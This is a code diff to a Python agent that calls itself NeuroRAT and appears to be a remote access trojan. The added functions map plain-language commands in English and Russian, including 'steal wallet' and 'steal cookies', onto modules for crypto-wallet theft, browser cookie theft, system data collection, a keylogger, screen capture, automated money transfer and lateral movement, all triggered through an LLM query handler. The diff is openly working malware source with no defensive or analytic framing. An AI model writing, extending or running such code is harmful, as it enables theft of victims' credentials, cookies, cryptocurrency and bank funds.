@@ -485,14 +485,13 @@ WantedBy=default.target
                 # Format: execute: [command]
                 cmd = query.split(":", 1)[1].strip()
                 return self._handle_shell_execution(cmd, command.command_id)
-            else:
-                return Response(
-                    command_id=command.command_id,
-                    success=False,
-                    data={},
-                    message="Query format not recognized and no LLM processor available"
-                )
-                
+            # --- Tool command interpretation ---
+            tool_result = self.handle_text_command(query)
+            return Response(
+                command_id=command.command_id,
+                success=True,
+                data={"result": tool_result}
+            )
         except Exception as e:
             logger.error(f"Error handling LLM query: {str(e)}")
             return Response(
@@ -880,6 +879,35 @@ WantedBy=default.target
         logger.info("Stopping NeuroRAT agent")
         self.agent.stop()
         logger.info("Agent stopped")
+
+    def handle_text_command(self, text: str) -> str:
+        module, params = self.interpret_tool_command(text)
+        if module and self.module_loader:
+            result = self.module_loader.run_module(module, **params)
+            return f"Модуль {module} выполнен. Результат: {result}"
+        else:
+            return "Неизвестная команда или инструмент. Используй: cookies, wallet, browser, system, keylogger, vnc."
+
+    def interpret_tool_command(self, text: str):
+        """Преобразует текстовую команду в вызов модуля и параметры"""
+        t = text.lower()
+        if any(x in t for x in ["wallet", "кошелек", "crypto", "btc", "eth", "укради кошелек"]):
+            return ("crypto_stealer", {})
+        if any(x in t for x in ["cookie", "cookies", "куки", "укради cookies", "cookie stealer"]):
+            return ("browser_stealer", {})
+        if any(x in t for x in ["browser", "браузер", "browser stealer", "укради браузер"]):
+            return ("browser_stealer", {})
+        if any(x in t for x in ["system", "sysinfo", "system info", "инфо", "собери инфу", "системная информация"]):
+            return ("system_stealer", {})
+        if any(x in t for x in ["keylogger", "кейлоггер", "start keylogger", "включи кейлоггер"]):
+            return ("keylogger", {"action": "start"})
+        if any(x in t for x in ["vnc", "screen", "скрин", "экран", "включи vnc"]):
+            return ("screen_capture", {})
+        if any(x in t for x in ["ats", "автоматический перевод", "transfer", "ats stealer"]):
+            return ("ats", {})
+        if any(x in t for x in ["lateral", "латераль", "lateral move", "перемещение"]):
+            return ("lateral", {})
+        return (None, {})
 
 
 def main():
